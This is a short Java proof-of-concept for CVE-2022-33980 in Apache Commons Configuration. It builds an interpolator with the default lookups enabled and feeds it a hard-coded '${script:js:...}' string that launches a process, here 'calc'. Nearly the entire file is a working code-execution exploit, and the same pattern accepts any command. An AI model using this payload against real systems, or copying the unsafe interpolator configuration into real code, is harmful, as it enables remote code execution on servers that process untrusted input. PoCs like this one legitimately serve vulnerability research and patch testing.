import org.apache.commons.configuration2.interpol.ConfigurationInterpolator;
import org.apache.commons.configuration2.interpol.InterpolatorSpecification;

// CVE-2022-33980
public class Server {
    public static void main(String[] args) {
        InterpolatorSpecification interpolatorSpecification = new InterpolatorSpecification.Builder().withPrefixLookups(ConfigurationInterpolator.getDefaultPrefixLookups()).withDefaultLookups(ConfigurationInterpolator.getDefaultPrefixLookups().values()).create();
        ConfigurationInterpolator interpolator = ConfigurationInterpolator.fromSpecification(interpolatorSpecification);

        String input = getInput();
        System.out.println(interpolator.interpolate(input));
    }

    private static String getInput() {
        return "${script:js:new java.lang.ProcessBuilder(\"calc\").start()}";
    }
}
